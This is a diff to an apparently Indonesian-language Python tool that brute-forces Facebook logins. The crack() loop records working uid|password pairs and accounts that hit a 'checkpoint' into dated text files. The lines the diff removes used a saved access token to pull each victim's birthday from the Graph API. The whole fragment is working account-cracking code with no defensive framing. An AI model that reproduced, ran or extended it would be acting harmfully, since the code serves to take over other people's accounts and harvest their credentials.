@@ -235,35 +235,15 @@ def crack(uid, pwx):
 				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
 				break
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				try:
-					token = open("login.txt", "r").read()
-					with requests.Session() as ses:
-						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
-						month, day, year = ttl.split("/")
-						month = bulan_ttl[month]
-						print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
-						cp.append("%s|%s"%(uid, pw))
-						open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
-						break
-				except (KeyError, IOError):
-					day = (" ")
-					month = (" ")
-					year = (" ")
-				except:pass
 				print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
-				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
+				open("%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
 				break
 			else:
 				continue
 
 		loop+=1
 
-
 if __name__ == "__main__":
-	try:os.mkdir('CP')
-	except:pass
-	try:os.mkdir('OK')
-	except:pass
 	brute()
 	
